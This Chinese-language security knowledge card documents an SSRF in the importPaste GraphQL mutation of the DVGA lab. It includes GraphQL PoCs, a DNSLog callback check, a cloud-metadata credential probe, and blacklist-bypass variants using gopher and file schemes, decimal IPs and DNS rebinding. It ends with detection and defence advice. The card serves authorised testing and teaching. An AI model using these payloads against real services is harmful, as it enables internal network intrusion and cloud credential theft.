---
id: web-generic-ssrf-graphql-importpaste-host
title: GraphQL importPaste 的 host 参数未做内网校验：服务端按用户提供的 URL 发起请求，DNSLog 确认 SSRF
type: scenario
domain: web
path: web/generic/ssrf
technique: graphql-importpaste-host-ssrf
aliases:
- GraphQL SSRF
- importPaste SSRF
- DVGA SSRF
- GraphQL mutation SSRF
- DNSLog 验证 SSRF
- URL 导入功能 SSRF
tags:
- graphql
- ssrf
- dnslog
- mutation
- dvga
- api
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V544
  verified_at: '2026-11-11T20:38:57+08:00'
  notes: 已逐张核对33张图（img_small，无失败）与content.md信息泄露-SSRF段：img25 DVGA Import a Paste页面URL填http://lqfuvhpeel.dgrh3.cn返回成功、img26 DevTools显示mutation ImportPaste(host:"lqfuvhpeel.dgrh3.cn",port:80,path:"/",scheme:"http")、img27 Yakit DNSLog两条A记录2024-02-18 22:03:00，证明服务端按用户host发起解析请求，SSRF成立。验证时软化1处表述：原文本篇未给resolver源码，将“文章环境中是拼接后交给curl”改为“URL由四参数拼成；DVGA实现中交给curl（见关联卡）”。去重：与已有web-generic-graphql-importpaste-command-injection为同一mutation但漏洞类别（host任意SSRF/DNSLog vs path分号注入RCE）、触发条件与PoC不同，判定related保留、不合并；文中内网IP/云元数据为后续探测示意，原文仅验证DNSLog回连。DVGA无版本标记，affected_versions不设。
---

## 一句话结论

`importPaste(host, port, path, scheme)` 这类"从 URL 导入内容"的 GraphQL mutation 会用客户端提供的四个参数拼出 URL 并由服务端发起请求；`host` 没有白名单或内网地址校验时，把它填成攻击者控制的域名（如 Yakit DNSLog 域名），服务端解析请求即可在 DNSLog 看到回连记录，证明 SSRF，进而可替换为内网 IP/端口或云元数据地址探测。

## 原理

- **功能即请求原语**：importPaste 的业务语义是"服务端帮用户抓取远端 paste 内容"，resolver 必然主动向 `scheme://host:port/path` 发起请求（URL 完全由这四个参数拼成；DVGA 实现中交给 curl 执行，见关联卡）。用户输入直接决定目标地址，即天然的 SSRF 原语。
- **缺少目标校验**：靶场未对 `host` 做域名白名单、内网/回环/元数据地址黑名单，也未做解析后 IP 校验；任何可解析域名与 IP 都会被请求。文章用 Yakit 生成临时 DNSLog 域名 `lqfuvhpeel.dgrh3.cn`，提交后 DNSLog 平台记录到两条 A 记录（22:03:00），证明服务端确实发出了 DNS 解析请求。
- **为什么 DNS 记录就能证明**：请求从服务端发起时，目标域名必须先被服务端 resolver 解析；DNSLog 只返回攻击者服务器控制的解析记录，浏览器/客户端从未访问该域名，因此记录只能来自服务端。若目标站点禁止回连出网，可用内网地址做端口/服务探测（响应时间、错误差异）。
- **危害**：可探测内网服务与端口、访问云元数据（169.254.169.254）获取临时凭据、绕过仅对公网开放的访问控制；若响应内容被 import 结果回显（本 mutation 返回 `result`），还可能直接读取内网 HTTP 响应内容。同一 mutation 若把 URL 拼进 shell 命令，还可升级为命令注入（见关联卡）。

## 触发条件

- GraphQL schema 暴露"根据 URL 导入/抓取/预览"的 mutation 或 query（importPaste、fetchUrl、previewLink、uploadFromUrl 等）。
- 服务端用用户提供的 host/scheme/port/path 构造请求，未限制目标地址（无白名单、无内网/RFC1918/链路本地/元数据 IP 过滤、无 DNS 重绑定防护）。
- 服务端有出网能力，或能访问目标内网；攻击者可发送自定义 GraphQL mutation。
- 仅用于授权测试；DNSLog/回连验证即可，避免实际读取敏感数据。

## 利用步骤

1. introspection/字段建议找到 importPaste 一类 mutation，确认参数（host/port/path/scheme）。
2. 先用正常参数验证功能：`host:"pastebin.com", port:443, path:"/", scheme:"https"`。
3. 在 Yakit DNSLog（或自建 Burp Collaborator/interactsh）生成临时域名，提交 `host:"<dnslog域>", port:80, path:"/", scheme:"http"`；观察 DNSLog 是否收到 A 记录，确认服务端发起请求。
4. 替换为内网目标做探测：`host:"127.0.0.1"`、`host:"10.0.0.5", port:6379`、`host:"169.254.169.254", path:"/latest/meta-data/"`，通过响应时间/错误/`result` 内容判断端口与服务。
5. 若回显 `result` 包含目标响应体，可直接读取云元数据或内网接口；否则结合时间差异或带外通道判断。
6. 评估出网与权限边界，记录证据；验证时控制频率避免影响业务。

## PoC

```graphql
# 正常导入（确认功能）
mutation ImportPaste {
  importPaste(host: "pastebin.com", port: 443, path: "/", scheme: "https") {
    result
  }
}

# SSRF 验证：host 指向 DNSLog 域名
mutation ImportPaste {
  importPaste(host: "lqfuvhpeel.dgrh3.cn", port: 80, path: "/", scheme: "http") {
    result
  }
}
```

```text
# DNSLog 平台收到（时间与提交请求一致）
lqfuvhpeel.dgrh3.cn  A  2024-02-18 22:03:00
lqfuvhpeel.dgrh3.cn  A  2024-02-18 22:03:00
```

```graphql
# 内网/云元数据探测（示意，仅授权环境）
mutation ImportPaste {
  importPaste(host: "169.254.169.254", port: 80,
              path: "/latest/meta-data/iam/security-credentials/", scheme: "http") {
    result
  }
}
```

## 变体与关联

- 变体：`scheme` 可控时尝试 `file://`、`gopher://`、`dict://`（取决于请求库是否支持协议），可升级为本地文件读取或内网协议攻击。
- 变体：以 IP 形式的十进制/八进制/IPv6 映射绕过黑名单（`2130706433`、`[::1]`、`0.0.0.0`）；DNS 重绑定绕过"解析时校验、请求时变化"的时间窗。
- 变体：抓取类 query（`previewLink(url)`）与异步任务（提交后 worker 抓取）同样是 SSRF 入口；异步场景无法用响应时间判断，需要带外通道。
- 关联：[[web-generic-graphql-importpaste-command-injection]]（同一 mutation 的 URL 拼接进 shell，SSRF 可升级为 RCE）、[[web-generic-graphql-endpoint-discovery-schema-enumeration]]（发现 import 类 mutation）、[[web-generic-ssrf-cerebro-rest-request-host-path]]（同类"host/path 由客户端指定"的回显 SSRF）。

## 检测与防御

- 检测：审计 resolver 中所有用用户输入构造 URL 的请求（requests/urllib/curl）；监控 import/fetch 类 mutation 的参数是否为 IP 字面量、内网域名或异常端口；对出站流量做基线告警。
- 防御：目标地址白名单（仅允许业务需要的域名）并校验解析后的 IP，拒绝 RFC1918/回环/链路本地/元数据网段；禁用不必要的协议；请求由独立出口代理执行并限制可访问网段；对 URL 导入功能加认证、限流与审计；不要把"用户可指定 URL"作为无风险功能。
- 说明：本文是 GraphQL mutation 触发的 SSRF 场景，severity 记为 medium（可探测内网/云元数据）；仅用于授权测试。
